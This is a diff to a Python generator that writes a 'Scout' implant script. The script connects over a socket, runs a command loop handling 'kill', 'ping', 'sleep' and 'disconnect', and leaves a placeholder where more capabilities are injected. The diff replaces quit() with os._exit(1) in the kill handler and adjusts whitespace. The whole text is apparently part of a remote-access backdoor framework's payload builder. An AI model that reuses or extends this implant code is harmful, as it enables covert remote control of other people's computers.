@@ -12,6 +12,7 @@ def main(option):
         timeout = config.scout_values['Timeout'][0]
         filepath = config.scout_values['Path'][0]
         config.import_statements.append('import socket')
+        config.import_statements.append('from os import _exit')
         config.import_statements.append('from time import sleep')
         f = open(filepath, 'w')
         f.write('''
@@ -27,6 +28,7 @@ def recv_all(sock):
             data += tmp_data
         except (socket.error, socket.timeout):
             return data
+
 while True:
     while True:
         try:
@@ -43,7 +45,7 @@ while True:
             command = data.split(' ',1)[0]
             if command == 'kill':
                 s.sendall('[*]Scout is killing itself...')
-                quit()
+                _exit(1)
             elif command == 'ping':
                 s.sendall('[+]Scout is alive')
             elif command == 'sleep':
@@ -55,8 +57,7 @@ while True:
             elif command == 'disconnect':
                 s.sendall('[*]Scout is disconnecting itself...')
                 sleep(3)
-                break                
-#Statements#
+                break#Statements#
             else:
                 s.sendall('[-]Scout does not have the capability to run this command. (Was it loaded during generation?)')
         except (socket.error,socket.timeout):
